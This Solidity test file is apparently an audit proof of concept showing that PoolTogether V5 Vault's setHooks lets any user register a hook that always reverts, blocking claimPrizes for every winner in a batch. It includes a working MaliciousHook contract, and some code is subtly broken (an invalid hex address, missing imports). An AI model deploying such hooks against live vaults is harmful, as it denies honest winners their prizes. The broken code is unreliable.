// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

/*
Exploit PoC for PoolTogether V5 Vault `setHooks` vulnerability.

The Vault lets ANY user register arbitrary hook logic that the claimer
will later execute during `claimPrizes()`.  
If the hook reverts (or consumes all gas) the whole prize-claiming
transaction reverts and **ALL** winners in that batch are denied their
prizes.

This test shows that a single malicious winner can permanently grief
the public claimer.

> forge test -vv
*/

import "forge-std/Test.sol";
import {Vault}          from "src/Vault.sol";
import {IVaultHooks, VaultHooks, IPrizeHooks} from "src/interfaces/IVaultHooks.sol";

/* -----------------------------  Minimal mocks  ----------------------------- */

contract MockERC20 is Test, ERC20("Mock", "MOCK") {
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

contract MockTwabController {
    /* simple in-memory bookkeeping that fulfils the tiny subset used by the Vault */
    mapping(address => uint256) public balance;
    mapping(address => mapping(address => uint256)) public delegated;

    // constants
    address public constant SPONSORSHIP_ADDRESS = address(0xBEEF);

    function balanceOf(address /*vault*/, address acct) external view returns (uint256) {
        return balance[acct];
    }

    function totalSupply(address /*vault*/) external view returns (uint256) {
        return balance[address(0x00)];
    }

    function mint(address to, uint96 amt) external {
        balance[to] += amt;
        balance[address(0x00)] += amt;
    }

    function burn(address from, uint96 amt) external {
        balance[from] -= amt;
        balance[address(0x00)] -= amt;
    }

    function transfer(address from, address to, uint96 amt) external {
        balance[from] -= amt;
        balance[to]   += amt;
    }

    function delegateOf(address /*vault*/, address acct) external view returns (address) {
        return delegated[msg.sender][acct];
    }

    function sponsor(address acct) external {
        delegated[msg.sender][acct] = SPONSORSHIP_ADDRESS;
    }
}

contract MockYieldVault is IERC4626, ERC20("yMOCK","yMOCK") {
    IERC20 public immutable assetToken;
    constructor(IERC20 _asset){ assetToken = _asset; }

    /* IERC4626 - minimal subset */

    function asset() public view returns (address){ return address(assetToken); }

    function decimals() public view override(ERC20) returns (uint8){ return 18; }

    function deposit(uint256 assets, address receiver) external returns (uint256){
        assetToken.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, assets);
        return assets;
    }
    function withdraw(
        uint256 assets,
        address receiver,
        address /*owner*/
    ) external returns (uint256){
        _burn(msg.sender, assets);
        assetToken.transfer(receiver, assets);
        return assets;
    }

    function maxWithdraw(address /*owner*/) external view returns(uint256){
        return assetToken.balanceOf(address(this));
    }

    /* --- unused / dummy --- */
    function totalAssets() external pure returns(uint256){ return 0; }
    function convertToShares(uint256 assets) external pure returns(uint256){ return assets;}
    function convertToAssets(uint256 shares) external pure returns(uint256){ return shares;}
    function maxDeposit(address) external pure returns(uint256){return type(uint256).max;}
    function previewDeposit(uint256) external pure returns(uint256){return 0;}
    function previewMint(uint256) external pure returns(uint256){return 0;}
    function maxMint(address) external pure returns(uint256){return 0;}
    function previewWithdraw(uint256) external pure returns(uint256){return 0;}
    function previewRedeem(uint256) external pure returns(uint256){return 0;}
    function deposit(uint256,uint256) external pure returns(uint256){return 0;}
    function mint(uint256,uint256) external pure returns(uint256){return 0;}
    function redeem(uint256,address,address) external pure returns(uint256){return 0;}
}

contract MockPrizePool {
    IERC20 public immutable prizeToken;
    constructor(IERC20 _pt){ prizeToken = _pt; }

    /* Claimed prize is hard-coded to 1 token for simplicity */
    function claimPrize(
        address /*winner*/,
        uint8   /*tier*/,
        uint32  /*index*/,
        address recipient,
        uint96  fee,
        address feeRecipient
    ) external returns(uint256){
        prizeToken.transfer(recipient, 1 ether - fee);
        if(fee != 0) prizeToken.transfer(feeRecipient, fee);
        return 1 ether; // total prize (including fee)
    }

    function contributePrizeTokens(address /*from*/, uint256 /*amount*/) external {}
}

/* --------------------------  Malicious Hook  ------------------------------- */

contract MaliciousHook is IPrizeHooks {
    /* Always reverts â€“ DoS */
    function beforeClaimPrize(
        address /*winner*/,
        uint8   /*tier*/,
        uint32  /*index*/
    ) external pure returns (address) {
        revert("Hook reverted - DoS");
    }

    function afterClaimPrize(
        address /*winner*/,
        uint8   /*tier*/,
        uint32  /*index*/,
        uint256 /*prize*/,
        address /*recipient*/
    ) external pure { }
}

/* ------------------------------  The Test  --------------------------------- */

contract Exploit_setHooks_DoS is Test {

    Vault            vault;
    MockERC20        asset;
    MockERC20        prize;
    address          attacker = address(0xA11CE);
    address          claimer  = address(0xC1A1M3);
    MaliciousHook    hook;

    function setUp() external {
        vm.startPrank(address(this));

        asset  = new MockERC20();
        prize  = new MockERC20();

        MockTwabController twab = new MockTwabController();
        MockYieldVault     yv   = new MockYieldVault(asset);
        MockPrizePool      pp   = new MockPrizePool(prize);

        vault = new Vault(
            IERC20(address(asset)),
            "VaultShare",
            "vSHARE",
            TwabController(address(twab)),
            IERC4626(address(yv)),
            PrizePool(address(pp)),
            claimer,             // claimer
            address(0xDEAD),     // yieldFeeRecipient
            0,                   // yieldFeePercentage
            address(this)        // owner
        );

        // fund attacker with some shares (irrelevant for DoS but nice-to-have)
        asset.mint(attacker, 10 ether);
        asset.approve(address(vault), 10 ether);
        vault.deposit(10 ether, attacker);

        hook = new MaliciousHook();

        vm.stopPrank();

        /* attacker registers malicious hooks */
        vm.startPrank(attacker);
        VaultHooks memory vh = VaultHooks({
            implementation: IPrizeHooks(address(hook)),
            useBeforeClaimPrize: true,
            useAfterClaimPrize:  false
        });
        vault.setHooks(vh);
        vm.stopPrank();
    }

    /* ------------------------------------------------------------------ */
    /*  The claimer is griefed: the whole transaction reverts immediately */
    /* ------------------------------------------------------------------ */
    function testDoSOnClaimPrizes() external {
        address[] memory winners     = new address[](1);
        winners[0] = attacker;

        uint32[][] memory prizeIds   = new uint32[][](1);
        prizeIds[0] = new uint32[](1);
        prizeIds[0][0] = uint32(0);

        vm.startPrank(claimer);
        vm.expectRevert(bytes("Hook reverted - DoS"));
        vault.claimPrizes(
            0,              // tier
            winners,
            prizeIds,
            0,              // feePerClaim
            address(0)      // feeRecipient
        );
        vm.stopPrank();
    }
}
